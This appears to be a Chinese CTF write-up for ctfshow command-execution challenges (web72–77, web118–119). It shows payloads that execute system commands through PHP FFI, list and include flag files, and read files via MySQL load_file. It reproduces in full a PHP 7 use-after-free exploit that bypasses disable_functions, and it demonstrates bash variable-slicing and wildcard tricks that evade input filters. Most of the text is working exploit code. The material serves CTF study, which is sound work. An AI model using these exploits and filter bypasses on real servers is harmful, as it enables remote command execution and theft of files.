<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);<span class="keyword">exit</span>(); </span><br></pre></td></tr></table></figure>

<p>访问 1.txt即可</p>
<h4 id="补充-羽师傅的总结"><a href="#补充-羽师傅的总结" class="headerlink" title="补充 羽师傅的总结"></a>补充 羽师傅的总结</h4><p>​                                                                                                                <strong>–摘取自<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108619930">https://blog.csdn.net/miuzzx/article/details/108619930</a></strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flag不在flag.php中,需要先查找flag所在的位置</span><br><span class="line">scandir()</span><br><span class="line">opendir()</span><br><span class="line">用法</span><br><span class="line">c=var_dump(scandir(<span class="string">&quot;/&quot;</span>));highlight_file(<span class="string">&quot;/flag.txt&quot;</span>);                                                       </span><br><span class="line">c=<span class="variable">$a</span>=opendir(<span class="string">&quot;/&quot;</span>); <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$a</span>)) !== <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="variable">$file</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; &#125;;highlight_file(<span class="string">&quot;/flag.txt&quot;</span>); </span><br><span class="line">后面因为是txt文件，所以直接用include直接包含就能显示flag include() require() </span><br><span class="line">用法： </span><br><span class="line">include(<span class="string">&quot;/flag.txt&quot;</span>);   </span><br><span class="line">require(<span class="string">&quot;/flag.txt&quot;</span>);  </span><br><span class="line"></span><br><span class="line">绕过<span class="built_in">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">直接后面输入 <span class="built_in">exit</span>();即可</span><br><span class="line">用法</span><br><span class="line">include(<span class="string">&quot;/flag.txt&quot;</span>);<span class="built_in">exit</span>(); </span><br><span class="line">require(<span class="string">&quot;/flag.txt&quot;</span>);<span class="built_in">exit</span>();  </span><br><span class="line"><span class="built_in">echo</span>(scandir(<span class="string">&quot;/&quot;</span>)[6]);include(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="built_in">exit</span>();  </span><br><span class="line"><span class="variable">$a</span>=opendir(<span class="string">&quot;/&quot;</span>); <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$a</span>)) !== <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="variable">$file</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; &#125;;include(<span class="string">&quot;flagx.txt&quot;</span>);<span class="built_in">exit</span>(); </span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">绕过open_basedir</span><br><span class="line">//可绕过web72目录限制,但无法读文件</span><br><span class="line"><span class="variable">$a</span>=opendir(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$a</span>)) !== <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="variable">$file</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; &#125;;include(<span class="string">&quot;flagx.txt&quot;</span>);<span class="built_in">exit</span>(); </span><br><span class="line"></span><br><span class="line">//可绕web72，利用uaf绕过函数限制 (传入后需url编码下)</span><br><span class="line">代码来源(https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)</span><br><span class="line">c=?&gt;&lt;?php</span><br><span class="line">pwn(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> pwn(<span class="variable">$cmd</span>) &#123;</span><br><span class="line">    global <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public <span class="variable">$a</span>;</span><br><span class="line">        public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">            global <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (new Exception)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!isset(<span class="variable">$backtrace</span>[1][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">class Helper &#123;</span><br><span class="line">    public <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> str2ptr(&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;</span><br><span class="line">    <span class="variable">$address</span> = 0;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-1; <span class="variable">$j</span> &gt;= 0; <span class="variable">$j</span>--) &#123;</span><br><span class="line">        <span class="variable">$address</span> &lt;&lt;= 8;</span><br><span class="line">        <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> ptr2str(<span class="variable">$ptr</span>, <span class="variable">$m</span> = 8) &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= sprintf(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; 0xff);</span><br><span class="line">        <span class="variable">$ptr</span> &gt;&gt;= 8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> write(&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = 8) &#123;</span><br><span class="line">    <span class="variable">$i</span> = 0;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; 0xff);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= 8;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> leak(<span class="variable">$addr</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;</span><br><span class="line">    global <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">    write(<span class="variable">$abc</span>, 0x68, <span class="variable">$addr</span> + <span class="variable">$p</span> - 0x10);</span><br><span class="line">    <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s</span> != 8) &#123; <span class="variable">$leak</span> %= 2 &lt;&lt; (<span class="variable">$s</span> * 8) - 1; &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> parse_elf(<span class="variable">$base</span>) &#123;</span><br><span class="line">    <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, 0x10, 2);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, 0x20);</span><br><span class="line">    <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, 0x36, 2);</span><br><span class="line">    <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, 0x38, 2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">        <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, 0, 4);</span><br><span class="line">        <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, 4, 4);</span><br><span class="line">        <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, 0x10);</span><br><span class="line">        <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, 0x28);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 6) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">            <span class="comment"># handle pie</span></span><br><span class="line">            <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == 2 ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">            <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 5) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">            <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>) &#123;</span><br><span class="line">    list(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / 8; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * 8);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x746e6174736e6f63)</span><br><span class="line">                <span class="built_in">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + 4) * 8);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x786568326e6962)</span><br><span class="line">                <span class="built_in">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * 8;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> get_binary_base(<span class="variable">$binary_leak</span>) &#123;</span><br><span class="line">    <span class="variable">$base</span> = 0;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; 0xfffffffffffff000;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x1000; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$start</span> - 0x1000 * <span class="variable">$i</span>;</span><br><span class="line">        <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, 0, 7);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> == 0x10102464c457f) &#123; <span class="comment"># ELF header</span></span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$addr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> get_system(<span class="variable">$basic_funcs</span>) &#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">        <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, 0, 6);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$f_name</span> == 0x6d6574737973) &#123; <span class="comment"># system</span></span><br><span class="line">            <span class="built_in">return</span> leak(<span class="variable">$addr</span> + 8);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$addr</span> += 0x20;</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != 0);</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> trigger_uaf(<span class="variable">$arg</span>) &#123;</span><br><span class="line">    <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">    <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">    <span class="variable">$vuln</span> = new Vuln();</span><br><span class="line">    <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">    die(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = 10; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line"><span class="variable">$contiguous</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">    <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$abc</span> = <span class="variable">$backtrace</span>[1][<span class="string">&#x27;args&#x27;</span>][0];</span><br><span class="line"></span><br><span class="line"><span class="variable">$helper</span> = new Helper;</span><br><span class="line"><span class="variable">$helper</span>-&gt;b = <span class="keyword">function</span> (<span class="variable">$x</span>) &#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == 79 || strlen(<span class="variable">$abc</span>) == 0) &#123;</span><br><span class="line">    die(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaks</span></span><br><span class="line"><span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, 0);</span><br><span class="line"><span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, 0x58);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - 0xc8;</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake value</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0x60, 2);</span><br><span class="line">write(<span class="variable">$abc</span>, 0x70, 6);</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake reference</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0x10, <span class="variable">$abc_addr</span> + 0x60);</span><br><span class="line">write(<span class="variable">$abc</span>, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, 0x20);</span><br><span class="line"></span><br><span class="line"><span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, 8);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake closure object</span></span><br><span class="line"><span class="variable">$fake_obj_offset</span> = 0xd0;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x110; <span class="variable">$i</span> += 8) &#123;</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0x20, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, 0xd0 + 0x38, 1, 4); <span class="comment"># internal func type</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0xd0 + 0x68, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用mysql load_file读文件   //过75,76</span><br><span class="line">try &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;   //flag36d.txt</span><br><span class="line">      <span class="built_in">echo</span>(<span class="variable">$row</span>[0]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = null;</span><br><span class="line">&#125; catch (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">  die();</span><br><span class="line">&#125;</span><br><span class="line">通过FFI（7.4版本）   //过77</span><br><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; xxx.txt&#x27;</span>;<span class="variable">$ffi</span>-   &gt;system(<span class="variable">$a</span>);<span class="built_in">exit</span>();   //访问xxx.txt</span><br></pre></td></tr></table></figure>



<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_YSY1xydUVD-163730173518333.png" alt="chrome_YSY1xydUVD"></p>
<p>这个题是羽师傅改编的</p>
<p>在原来过滤的基础上增加了数字的过滤。<br>linux中存在的大量的内置变量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">月饼杯web3   payload:<span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:5:1&#125;</span> ????.??? 构造出的是 nl flag.php</span><br><span class="line">所有我们现在想到简易一点的方法就是得到一个n一个l</span><br><span class="line">发现 <span class="variable">$PATH</span>的最后一位是n <span class="variable">$PWD</span>的最后一位 也就是 /var/www/html的最后一位是l</span><br><span class="line">在linux中可以用~获取变量的最后几位</span><br></pre></td></tr></table></figure>

<p>而字母起到的作用是和0相同的，所有<code>$&#123;PATH:~A&#125;</code>其实就是<code>$&#123;PATH:~0&#125;</code></p>
<p>从源码中看到了变量code，所以构造<code>payload：code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</code></p>
<p>输入并没有发现flag，后来在输入框输入<code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</code>，查看源代码得到flag</p>
<h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p>同上一题</p>
<p>把path和bash过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这时我们可以利用通配符 调用base64命令，也就是构造出 /bin/base64 flag.php</span><br><span class="line">/???<span class="number">4</span> ???.???</span><br><span class="line">如果可以构造出来/和<span class="number">4</span>不就可以了吗</span><br></pre></td></tr></table></figure>

<p>只要找到一个变量的长度是4就可以了。/还是很好找的 <code>$PWD</code>的第一位就是了<br>我们发现<code>$&#123;#RANDOM&#125;</code>可以实现</p>
<p>不加<code>#</code>是变量的值，加了<code>#</code>是变量的值的长度。<br>这里大师傅们用了这两个内置变量：RANDOM和SHLVL。</p>
